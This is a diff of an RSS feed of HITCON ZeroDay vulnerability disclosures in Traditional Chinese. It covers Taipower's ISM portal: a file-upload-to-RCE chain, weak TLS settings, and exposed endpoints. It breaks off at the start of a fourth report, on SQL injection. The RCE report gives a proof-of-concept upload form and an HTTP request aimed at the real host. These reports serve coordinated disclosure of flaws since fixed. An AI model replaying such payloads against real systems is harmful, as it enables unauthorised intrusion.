@@ -1,4 +1,1451 @@
-<rss version="2.0" encoding="UTF-8"><channel><title>HITCON ZeroDay - 公開漏洞</title><link>https://zeroday.hitcon.org/vulnerability/disclosed</link><description>ZeroDay 是一個銜接資安專家與組織間的良性溝通橋樑的漏洞提報平台，專門協助接獲漏洞通報並提報予組織和修正漏洞等服務。</description><author>HITCON ZeroDay</author><image><url>https://zeroday.hitcon.org/images/favicon/favicon.png</url></image><language>zh_TW</language><copyright>HITCON ZeroDay</copyright><item><title>國立臺北科技大學電機工程系 存在 SQL injection</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00243</link><description><div class="container">
+<rss version="2.0" encoding="UTF-8"><channel><title>HITCON ZeroDay - 公開漏洞</title><link>https://zeroday.hitcon.org/vulnerability/disclosed</link><description>ZeroDay 是一個銜接資安專家與組織間的良性溝通橋樑的漏洞提報平台，專門協助接獲漏洞通報並提報予組織和修正漏洞等服務。</description><author>HITCON ZeroDay</author><image><url>https://zeroday.hitcon.org/images/favicon/favicon.png</url></image><language>zh_TW</language><copyright>HITCON ZeroDay</copyright><item><title>[Bounty] 台灣電力公司 RCE</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00173</link><description><div class="container">
+ <h2 class="always-not-there">
+  Vulnerability Detail Report
+ </h2>
+ <section class="vul-detail-section overview">
+  <h3 class="always-not-there">
+   Vulnerability Overview
+  </h3>
+  <div class="section-content overview">
+   <ul>
+    <li class="zdid col-risk-critical-pseud-b">
+     <span class="label">
+      ZDID:
+     </span>
+     <span class="value">
+      ZD-2022-00173
+     </span>
+    </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      台灣電力公司
+     </span>
+    </li>
+    <li class="title">
+     <span class="label">
+      Title:
+     </span>
+     <span class="value">
+      [Bounty] 台灣電力公司 RCE
+     </span>
+    </li>
+    <li class="intro">
+     <span class="label">
+      Introduction:
+     </span>
+     <span class="value">
+      IDOR-&gt;RCE
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   處理狀態
+  </h3>
+  <div class="section-content status">
+   <h4 class="always-not-there">
+    目前狀態
+   </h4>
+   <div class="status-label col-status-200-tx">
+    公開
+   </div>
+   <div class="status-descr">
+    Last Update : 2022/04/17
+   </div>
+   <ul class="zdui-status-timeline stat-tn-risk-critical">
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       新提交
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已審核
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已通報
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已修補
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已複測
+      </span>
+     </div>
+    </li>
+    <li class="just-arrived">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       公開
+      </span>
+     </div>
+    </li>
+   </ul>
+   <h4 class="always-not-there">
+    處理歷程
+   </h4>
+   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
+   </div>
+   <ul class="status-log-list" id="vul-status-log-list">
+    <li>
+     <span class="log-date">
+      2022/02/26 20:42:22
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      新提交 (由 Hzllaga 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/26 20:48:04
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      新提交 (由 Hzllaga 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/26 21:06:24
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      新提交 (由 Hzllaga 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/03/01 10:44:27
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      審核中 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/13 13:39:53
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      複測申請中 (由 組織帳號 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/13 14:07:47
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      確認已修補 (由 Hzllaga 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/17 03:00:08
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   詳細資料
+  </h3>
+  <div class="section-content info">
+   <ul>
+    <li>
+     ZDID：ZD-2022-00173
+    </li>
+    <li>
+     通報者：haihai (
+     <a href="/user/haihai">
+      Hzllaga
+     </a>
+     )
+    </li>
+    <li>
+     風險：嚴重
+    </li>
+    <li>
+     類型：任意檔案上傳 (Arbitrary File Upload)
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可上傳任意檔案至該主機，有機會經由上傳之文件取得該主機系統權限。
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Unrestricted File Upload
+    <br/>
+    https://www.owasp.org/index.php/Unrestricted_File_Upload
+    <br/>
+    <br/>
+    漏洞說明： CWE-434: Unrestricted Upload of File with Dangerous Type
+    <br/>
+    https://cwe.mitre.org/data/definitions/434.html
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://ism.taipower.com.tw/Message/Reply
+    <br/>
+    https://ism.taipower.com.tw/Message/GetMsgListStr
+    <br/>
+    https://ism.taipower.com.tw/MessageQry/Reply
+    <br/>
+    https://ism.taipower.com.tw/MessageQry/GetMsgListStr
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     通過字典列舉，發現許多控制器可以直接被訪問
+    </p>
+    <p>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7336/attachments/5ff2ffc8c4ac4ba82dafc6f218d2cda2"/>
+    </p>
+    <p>
+     其中Message控制器的原始碼包含上傳的功能，通過幾小時的研究，發現可以透過回覆留言的方法上傳，並呼叫查看內文的API來找到上傳後的路徑
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7336/attachments/afd1abca0f9b60be93d9a558fd8b540e"/>
+    </p>
+    <p>
+     PoC1:
+    </p>
+    <pre><code>&lt;form action="https://ism.taipower.com.tw/Message/Reply" method="post" enctype="multipart/form-data"&gt;
+&lt;input type="text" name="txtmsg_location" value="zxc"&gt;
+&lt;input type="text" name="txtmsg_replycontent" value="zxc"&gt;
+&lt;input type="text" name="hdmsgid" value="48800"&gt;
+  &lt;input type="file" name="uploadsreply"&gt;
+  &lt;input type="submit" name="submit"&gt;
+&lt;/form&gt;</code></pre>
+    <p>
+     PoC2:
+    </p>
+    <pre><code>POST /Message/GetMsgListStr HTTP/2
+Host: ism.taipower.com.tw
+Content-Type: application/json
+Content-Length: 17
+
+{"msgid":"48800"}</code></pre>
+    <p>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7336/attachments/5621a07cd61ed7a017773c5162a63bd8"/>
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7336/attachments/540bc2d57e742483c9ac17d5323cf34f"/>
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7336/attachments/5af518a36ea688d97c6b92720e9dc7ce"/>
+    </p>
+    <p>
+     後來聽說Message控制器跟同事重複了，Fuzzing出另一個控制器存在一樣問題:
+     <br/>
+     <a href="https://ism.taipower.com.tw/MessageQry/Reply">
+      https://ism.taipower.com.tw/MessageQry/Reply
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/MessageQry/GetMsgListStr">
+      https://ism.taipower.com.tw/MessageQry/GetMsgListStr
+     </a>
+    </p>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7336/attachments/5ff2ffc8c4ac4ba82dafc6f218d2cda2" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7336/attachments/afd1abca0f9b60be93d9a558fd8b540e" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7336/attachments/5621a07cd61ed7a017773c5162a63bd8" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7336/attachments/540bc2d57e742483c9ac17d5323cf34f" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7336/attachments/5af518a36ea688d97c6b92720e9dc7ce" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   留言討論
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="comments-block" id="comments_block">
+    </div>
+    <div class="login-and-comment">
+     <a href="/auth/login">
+      登入後留言
+     </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
+    </div>
+   </div>
+  </div>
+ </section>
+</div>
+</description><pubDate>Sat, 26 Feb 2022 20:42:22 GMT</pubDate></item><item><title>[Bounty] 台灣電力公司SSL/TLS弱密碼組合未停用</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00165</link><description><div class="container">
+ <h2 class="always-not-there">
+  Vulnerability Detail Report
+ </h2>
+ <section class="vul-detail-section overview">
+  <h3 class="always-not-there">
+   Vulnerability Overview
+  </h3>
+  <div class="section-content overview">
+   <ul>
+    <li class="zdid col-risk-medium-pseud-b">
+     <span class="label">
+      ZDID:
+     </span>
+     <span class="value">
+      ZD-2022-00165
+     </span>
+    </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      台灣電力公司
+     </span>
+    </li>
+    <li class="title">
+     <span class="label">
+      Title:
+     </span>
+     <span class="value">
+      [Bounty] 台灣電力公司SSL/TLS弱密碼組合未停用
+     </span>
+    </li>
+    <li class="intro">
+     <span class="label">
+      Introduction:
+     </span>
+     <span class="value">
+      SSL/TLS弱密碼組合未停用
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   處理狀態
+  </h3>
+  <div class="section-content status">
+   <h4 class="always-not-there">
+    目前狀態
+   </h4>
+   <div class="status-label col-status-200-tx">
+    公開
+   </div>
+   <div class="status-descr">
+    Last Update : 2022/04/17
+   </div>
+   <ul class="zdui-status-timeline stat-tn-risk-medium">
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       新提交
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已審核
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已通報
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已修補
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已複測
+      </span>
+     </div>
+    </li>
+    <li class="just-arrived">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       公開
+      </span>
+     </div>
+    </li>
+   </ul>
+   <h4 class="always-not-there">
+    處理歷程
+   </h4>
+   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
+   </div>
+   <ul class="status-log-list" id="vul-status-log-list">
+    <li>
+     <span class="log-date">
+      2022/02/25 16:44:17
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      新提交 (由 AlexTang 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/26 10:12:36
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      審核中 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/13 13:38:18
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      複測申請中 (由 組織帳號 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/13 13:45:25
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      確認已修補 (由 AlexTang 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/17 03:00:05
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   詳細資料
+  </h3>
+  <div class="section-content info">
+   <ul>
+    <li>
+     ZDID：ZD-2022-00165
+    </li>
+    <li>
+     通報者：Scanda528 (
+     <a href="/user/Scanda528">
+      AlexTang
+     </a>
+     )
+    </li>
+    <li>
+     風險：中
+    </li>
+    <li>
+     類型：使用含已知漏洞之元件 (Using Known Vulnerable Components)
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    系統使用已存在漏洞的元件，攻擊者可以利用該漏洞執行惡意指令，甚至操控系統。
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Top 10 - 2017 A9 - Using Components with Known Vulnerabilities
+    <br/>
+    https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://ism.taipower.com.tw/Login
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     SSL/TLS弱密碼組合未停用(chrome+F12檢視為TLS1.2，但1.0 1.1未停用)
+     <br/>
+     攻擊者有可能竊取或操作客戶階段作業和 Cookie，可能用來假冒合法的使用者可以檢視或變更使用者記錄，以及以該使用者的身分來執行交易，在 TLS 1.0 和更舊版本，有可能預測區塊密碼加密的「起始設定向量」。這可讓中間人攻擊者猜測被加密的值，請停用支援含 CBC 的 SSLv3/TLS1.0 密碼組合。
+    </p>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   修補建議
+  </h3>
+  <div class="section-content zdui-md-content">
+   <p>
+    攻擊者有可能竊取或操作客戶階段作業和 Cookie，可能用來假冒合法的使用者可以檢視或變更使用者記錄，以及以該使用者的身分來執行交易，在 TLS 1.0 和更舊版本，有可能預測區塊密碼加密的「起始設定向量」。這可讓中間人攻擊者猜測被加密的值，請停用支援含 CBC 的 SSLv3/TLS1.0 密碼組合。
+    <br>
+     IIS
+     <br/>
+     https://docs.microsoft.com/zh-tw/security/engineering/solving-tls1-problem
+     <br/>
+     https://www.pro2e.com.tw/?p=2078
+     <br/>
+     Apache
+     <br/>
+     https://ishm.idv.tw/?p=396
+     <br/>
+    </br>
+   </p>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7328/attachments/f29b38ce66ea60ab9bc540289ec3f7f9" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   留言討論
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="comments-block" id="comments_block">
+    </div>
+    <div class="login-and-comment">
+     <a href="/auth/login">
+      登入後留言
+     </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
+    </div>
+   </div>
+  </div>
+ </section>
+</div>
+</description><pubDate>Fri, 25 Feb 2022 16:44:17 GMT</pubDate></item><item><title>[Bounty] 台灣電力公司</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00163</link><description><div class="container">
+ <h2 class="always-not-there">
+  Vulnerability Detail Report
+ </h2>
+ <section class="vul-detail-section overview">
+  <h3 class="always-not-there">
+   Vulnerability Overview
+  </h3>
+  <div class="section-content overview">
+   <ul>
+    <li class="zdid col-risk-medium-pseud-b">
+     <span class="label">
+      ZDID:
+     </span>
+     <span class="value">
+      ZD-2022-00163
+     </span>
+    </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      台灣電力公司
+     </span>
+    </li>
+    <li class="title">
+     <span class="label">
+      Title:
+     </span>
+     <span class="value">
+      [Bounty] 台灣電力公司
+     </span>
+    </li>
+    <li class="intro">
+     <span class="label">
+      Introduction:
+     </span>
+     <span class="value">
+      IDOR
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   處理狀態
+  </h3>
+  <div class="section-content status">
+   <h4 class="always-not-there">
+    目前狀態
+   </h4>
+   <div class="status-label col-status-200-tx">
+    公開
+   </div>
+   <div class="status-descr">
+    Last Update : 2022/04/17
+   </div>
+   <ul class="zdui-status-timeline stat-tn-risk-medium">
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       新提交
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已審核
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已通報
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已修補
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已複測
+      </span>
+     </div>
+    </li>
+    <li class="just-arrived">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       公開
+      </span>
+     </div>
+    </li>
+   </ul>
+   <h4 class="always-not-there">
+    處理歷程
+   </h4>
+   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
+   </div>
+   <ul class="status-log-list" id="vul-status-log-list">
+    <li>
+     <span class="log-date">
+      2022/02/25 14:48:22
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      新提交 (由 水皮 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/26 10:13:12
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      審核中 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/03/01 15:03:54
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      審核中 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/13 13:38:54
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      複測申請中 (由 組織帳號 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/13 13:42:24
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      確認已修補 (由 水皮 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/17 03:00:04
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   詳細資料
+  </h3>
+  <div class="section-content info">
+   <ul>
+    <li>
+     ZDID：ZD-2022-00163
+    </li>
+    <li>
+     通報者：waterpeitw (
+     <a href="/user/waterpeitw">
+      水皮
+     </a>
+     )
+    </li>
+    <li>
+     風險：中
+    </li>
+    <li>
+     類型：不安全的直接存取物件 (Insecure Direct Object References, IDOR)
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可經由該漏洞取得系統中的其他使用者的資料或是系統檔案。
+    <br/>
+    <br/>
+    OWASP Top 10 - 2013 A4 - Insecure Direct Object References
+    <br/>
+    https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References
+    <br/>
+    <br/>
+    Insecure Direct Object Reference Prevention Cheat Sheet
+    <br/>
+    https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.md
+    <br/>
+    <br/>
+    OWASP Top 10 - 2017 A5 - Broken Access Control
+    <br/>
+    https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://ism.taipower.com.tw/register
+    <br/>
+    https://ism.taipower.com.tw/register/print/
+    <br/>
+    https://ism.taipower.com.tw/uploads
+    <br/>
+    https://ism.taipower.com.tw/log
+    <br/>
+    https://ism.taipower.com.tw/message
+    <br/>
+    https://ism.taipower.com.tw/organization
+    <br/>
+    https://ism.taipower.com.tw/contract
+    <br/>
+    https://ism.taipower.com.tw/contractor
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     <a href="https://ism.taipower.com.tw/register">
+      https://ism.taipower.com.tw/register
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/register/print/">
+      https://ism.taipower.com.tw/register/print/
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/uploads">
+      https://ism.taipower.com.tw/uploads
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/log">
+      https://ism.taipower.com.tw/log
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/message">
+      https://ism.taipower.com.tw/message
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/organization">
+      https://ism.taipower.com.tw/organization
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/contract">
+      https://ism.taipower.com.tw/contract
+     </a>
+     <br/>
+     <a href="https://ism.taipower.com.tw/contractor">
+      https://ism.taipower.com.tw/contractor
+     </a>
+    </p>
+    <p>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7326/attachments/3356b9f733db2bf75489d3cb481b555e"/>
+    </p>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7326/attachments/3356b9f733db2bf75489d3cb481b555e" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   留言討論
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="comments-block" id="comments_block">
+    </div>
+    <div class="login-and-comment">
+     <a href="/auth/login">
+      登入後留言
+     </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
+    </div>
+   </div>
+  </div>
+ </section>
+</div>
+</description><pubDate>Fri, 25 Feb 2022 14:48:22 GMT</pubDate></item><item><title>金國東石海產店網站，存在SQL Injection漏洞</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00095</link><description><div class="container">
+ <h2 class="always-not-there">
+  Vulnerability Detail Report
+ </h2>
+ <section class="vul-detail-section overview">
+  <h3 class="always-not-there">
+   Vulnerability Overview
+  </h3>
+  <div class="section-content overview">
+   <ul>
+    <li class="zdid col-risk-high-pseud-b">
+     <span class="label">
+      ZDID:
+     </span>
+     <span class="value">
+      ZD-2022-00095
+     </span>
+    </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/4147">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      金國東石海產店
+     </span>
+    </li>
+    <li class="title">
+     <span class="label">
+      Title:
+     </span>
+     <span class="value">
+      金國東石海產店網站，存在SQL Injection漏洞
+     </span>
+    </li>
+    <li class="intro">
+     <span class="label">
+      Introduction:
+     </span>
+     <span class="value">
+      啊就...SQL Injection 漏洞
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   處理狀態
+  </h3>
+  <div class="section-content status">
+   <h4 class="always-not-there">
+    目前狀態
+   </h4>
+   <div class="status-label col-status-200-tx">
+    公開
+   </div>
+   <div class="status-descr">
+    Last Update : 2022/04/17
+   </div>
+   <ul class="zdui-status-timeline stat-tn-risk-high">
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       新提交
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
